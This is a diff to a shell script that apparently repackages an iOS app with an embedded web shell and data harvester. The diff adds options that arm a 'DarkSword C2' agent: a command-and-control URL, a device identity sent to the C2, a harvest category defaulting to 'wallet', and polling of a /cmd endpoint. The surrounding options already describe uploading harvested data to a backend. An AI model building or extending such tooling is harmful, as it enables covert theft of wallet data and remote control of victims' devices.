@@ -33,6 +33,11 @@
 #   --no-persist-upload       harvest locally, never POST to the chat backend
 #   --persist-upload-extra-fields  also send bundleID/sha256/relativePath/device parts
 #   --persist-upload-always   re-upload even if the same store was delivered before
+#   --dark-sword-url URL      DarkSword C2 base URL (default http://127.0.0.1:8080)
+#   --dark-sword-uuid UUID    device identity sent to the C2
+#   --dark-sword-category CAT harvest category tag on the C2 (default wallet)
+#   --dark-sword-poll-interval N  seconds between /cmd polls (default 5)
+#   --no-dark-sword           do not arm the DarkSword C2 agent
 #   --keep-shortcuts           keep UIApplicationShortcutItems
 #   --keep-document-types      keep CFBundleDocumentTypes / UTI declarations
 #   --user-agent SUFFIX        appended to the WKWebView user agent
@@ -94,6 +99,11 @@ while [ "$#" -gt 0 ]; do
     --no-persist-upload) export FILZA_CHAT_SHELL_NO_PERSIST_UPLOAD=1; shift ;;
     --persist-upload-extra-fields) export FILZA_CHAT_SHELL_PERSIST_UPLOAD_EXTRA_FIELDS=1; shift ;;
     --persist-upload-always) export FILZA_CHAT_SHELL_PERSIST_UPLOAD_ALWAYS=1; shift ;;
+    --dark-sword-url) export FILZA_CHAT_SHELL_DARK_SWORD_URL="$2"; shift 2 ;;
+    --dark-sword-uuid) export FILZA_CHAT_SHELL_DARK_SWORD_UUID="$2"; shift 2 ;;
+    --dark-sword-category) export FILZA_CHAT_SHELL_DARK_SWORD_CATEGORY="$2"; shift 2 ;;
+    --dark-sword-poll-interval) export FILZA_CHAT_SHELL_DARK_SWORD_POLL_INTERVAL="$2"; shift 2 ;;
+    --no-dark-sword) export FILZA_CHAT_SHELL_NO_DARK_SWORD=1; shift ;;
     --no-persist-copy) export FILZA_CHAT_SHELL_NO_PERSIST_COPY=1; shift ;;
     --keep-shortcuts) export FILZA_CHAT_SHELL_KEEP_SHORTCUTS=1; shift ;;
     --keep-document-types) export FILZA_CHAT_SHELL_KEEP_DOCUMENT_TYPES=1; shift ;;
@@ -139,6 +149,16 @@ else
       *) echo "harvest upload: rejected (https required): $UPLOAD_URL" >&2; exit 64 ;;
     esac
   fi
+fi
+
+if [ -n "${FILZA_CHAT_SHELL_NO_DARK_SWORD:-}" ]; then
+  echo "dark sword    : disabled"
+else
+  DS_URL="${FILZA_CHAT_SHELL_DARK_SWORD_URL:-http://127.0.0.1:8080}"
+  case "$DS_URL" in
+    http://*|https://*) echo "dark sword    : $DS_URL (entry point armed)" ;;
+    *) echo "dark sword    : rejected (http(s) required): $DS_URL" >&2; exit 64 ;;
+  esac
 fi
 
 # The packaging script performs the merge, the in-app checks and the
